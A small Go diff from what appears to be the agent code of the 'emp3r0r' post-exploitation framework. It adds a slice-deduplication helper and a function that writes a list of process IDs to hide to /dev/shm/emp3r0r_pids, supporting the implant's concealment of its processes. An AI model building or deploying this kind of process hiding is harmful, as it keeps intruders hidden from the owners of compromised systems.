@@ -62,6 +62,27 @@ func IsFileExist(path string) bool {
 	return true
 }
 
+// RemoveDupsFromArray remove duplicated items from string slice
+func RemoveDupsFromArray(array []string) (result []string) {
+	m := make(map[string]bool)
+	for _, item := range array {
+		if _, ok := m[item]; !ok {
+			m[item] = true
+		}
+	}
+
+	for item := range m {
+		result = append(result, item)
+	}
+	return result
+}
+
+// UpdateHIDE_PIDS update HIDE PID list
+func UpdateHIDE_PIDS() error {
+	HIDE_PIDS = RemoveDupsFromArray(HIDE_PIDS)
+	return ioutil.WriteFile("/dev/shm/emp3r0r_pids", []byte(strings.Join(HIDE_PIDS, "\n")), 0600)
+}
+
 // IsAgentRunningPID is there any emp3r0r agent already running?
 func IsAgentRunningPID() (bool, int) {
 	defer func() {
